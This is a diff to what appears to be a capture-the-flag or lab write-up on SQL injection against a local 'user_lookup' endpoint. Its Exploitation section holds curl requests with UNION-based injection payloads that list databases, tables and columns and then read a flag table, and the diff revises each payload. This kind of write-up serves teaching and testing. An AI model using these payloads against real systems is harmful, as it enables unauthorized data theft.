@@ -7,13 +7,13 @@ db.testQuery("SELECT username\nFROM user\nWHERE username LIKE '%" + search + "%'
 ```
 
 ## Exploitation
-We can list the databases one by one using:
+We can list the databases using:
 ```bash
 curl --request POST \
   --url http://localhost:80/user_lookup \
   --header 'Content-Type: application/json' \
   --data '{
-  "search": "'\'' AND 1=2 UNION ALL SELECT distinct database FROM system.tables LIMIT 1 OFFSET 1 UNION ALL SELECT '\''1'\'' WHERE '\''1'\''='\''"
+  "search": "'\'' AND 1=2 UNION ALL SELECT distinct database FROM system.tables WHERE '\''%'\''='\''"
 }'
 ```
 
@@ -23,7 +23,7 @@ curl --request POST \
   --url http://localhost:80/user_lookup \
   --header 'Content-Type: application/json' \
   --data '{
-  "search": "'\'' AND 1=2 UNION ALL SELECT name FROM system.tables WHERE database='\''default'\'' LIMIT 1 OFFSET 0 UNION ALL SELECT '\''1'\'' WHERE '\''1'\''='\''"
+  "search": "'\'' AND 1=2 UNION ALL SELECT name FROM system.tables WHERE database='\''default'\'' AND '\''%'\''='\''"
 }'
 ```
 
@@ -33,7 +33,7 @@ curl --request POST \
   --url http://localhost:80/user_lookup \
   --header 'Content-Type: application/json' \
   --data '{
-  "search": "'\'' AND 1=2 UNION ALL SELECT name FROM system.columns WHERE database='\''default'\'' AND table='\''flag'\'' LIMIT 1 OFFSET 0 UNION ALL SELECT '\''1'\'' WHERE '\''1'\''='\''"
+  "search": "'\'' AND 1=2 UNION ALL SELECT name FROM system.columns WHERE database='\''default'\'' AND table='\''flag'\'' AND '\''%'\''='\''"
 }'
 ```
 
@@ -43,7 +43,7 @@ curl --request POST \
   --url http://localhost:80/user_lookup \
   --header 'Content-Type: application/json' \
   --data '{
-  "search": "'\'' AND 1=2 UNION ALL SELECT flag FROM default.flag LIMIT 1 OFFSET 0 UNION ALL SELECT '\''1'\'' WHERE '\''1'\''='\''"
+  "search": "'\'' AND 1=2 UNION ALL SELECT flag FROM default.flag WHERE '\''%'\''='\''"
 }'
 ```
 
